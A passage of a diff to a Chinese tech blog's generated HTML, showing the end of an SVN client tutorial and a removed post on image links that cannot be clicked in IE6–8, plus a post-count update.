Branch是分支的意思。例如当在设计一个东西的时候，不同的人有不同的实现，但是没有经过实践检验，谁也不想直接覆盖掉其他人的设计，所以可以引出不同的分支。将来如果需要，可以将这些分支进行合并。 tag是打标签的意思。通常当项目开发到一定程度，已经可以稳定运行的时候，可以对其打上一个标签，作为稳定版。将来可以方便的找到某个特定的版本（当然我们也可以使用版本号来查找，但是数字毕竟不方便） SVN对于分支和标签都是采用类似Linux下硬链接的方式（同一个文件可以存在两个地方，删除一个不会影响另一个，所做修改会影响另一个），来管理文件的，而不是简单的复制一份文件的拷贝，所以不会有浪费存储空间的问题存在。 29、Export（导出） 这个功能是方便我们部署用。当我们需要发布一个稳定版本时，就可以使用这个功能将整个工程导出到某个文件夹，新的文件夹将不会包含任何版本信息了。 30、Relocate（版本库转移） 当我们版本库发生转移的时候就需要用到这个功能了。例如我原先的版本库是建在U盘上的，现在转移到（复制整个配置库文件夹）开发服务器上，使用https代替文件系统的访问。因此就需要将原来的工作拷贝的目标版本库重新定位到开发服务器上。 31、create patch（创建补丁） 创建补丁。如果管理员不想让任何人都随便提交修改，而是都要经过审核才能做出修改，那么其他人就可以通过创建补丁的方式，把修改信息（补丁文件）发送给管理员，管理员审核通过之后就可以使用apply patch提交这次修改了。 32、diff (比较修改部分) 如果你修改了一个文件，又不确定改了那些地方，这时你可以在相应文件上点右键，选择diff查看，与服务器上最新版的差异</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-        
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.veitor.net/posts/problem-of-link-pictures-under-IE678/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpg">
-      <meta itemprop="name" content="Veitor">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Veitor的技术点滴">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/posts/problem-of-link-pictures-under-IE678/" class="post-title-link" itemprop="url">IE678下链接图片点不中问题讨论</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2014-06-26 07:01:17" itemprop="dateCreated datePublished" datetime="2014-06-26T07:01:17+08:00">2014-06-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-24 22:53:48" itemprop="dateModified" datetime="2020-05-24T22:53:48+08:00">2020-05-24</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/JS/" itemprop="url" rel="index">
-                    <span itemprop="name">JS</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><a href="http://storage.veitor.net/uploads/2014/06/QQ截图20140626150002.jpg" target="_blank" rel="noopener"><img src="http://storage.veitor.net/uploads/2014/06/QQ%E6%88%AA%E5%9B%BE20140626150002.jpg" alt="QQ截图20140626150002"></a>因为今天制作的房产项目中出现了图片链接无法点击问题，重新审视了一下块集元素和内联元素，不是混淆，而是重新想了一下新的东西，有时候在我们进行重构的时候，偶尔会为了实际需要而将内联元素强制显示为块集元素，在一般情况下，这个是不会出问题的，而且可以很轻松的通过标准，但是在某一些情况下，虽然验证工具可以放过我们，但是在ie678下面会出现解析不正确的问题，下面就简单跟大家分享一下这个问题。 有时候由于需要文字和图片同时获取到点击态，或者需要实现一些高难度的效果，就需要多标签来写结构，可能的结构会如下所示： <div class="block"> <a href="http://www.hualongxiang.com" target="_blank" rel="noopener"><span><img src="http://static.hualongxiang.com/logo/logo.jpg" alt="hlx" /></span></a> </div> 在没有被赋予强大的CSS的时候，是可以正常点击的，但是当赋予需要的CSS的时候，在ie8一下就会出现图片区域点击不到的情况： .block span{float:left;} 如果将span标签块集化： .block span{float:left;dispaly:block;width:100px;height:100px;} 最终的结果依然不是不能点击到，但是图片区域以为的内容确可以正常点击。 而对于此，我的理解是这样的： 因为a标签本身就是一个内联元素标签，内联标签内正常情况只允许放置内联元素，放置块集元素本身语法就有问题，虽然表面上放置的span标签，但是我们又将其强制块集化，在某些浏览器下还是会解析错误，比如说ie6/7，所以这里针对链接的这种情况，出现的问题就是图片区域无法点击。 针对这种问题的解决方法： 保证在a标签中不要放置块集元素，或者强制块集元素，如果需要解决一些特殊效果，可以采取将这个强制元素跟a内置的img标签同级放置，这样也可以避免图片点击不到问题。</p>
 
       
     </div>
@@ -1131,7 +1294,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">81</span>
+          <span class="site-state-item-count">82</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
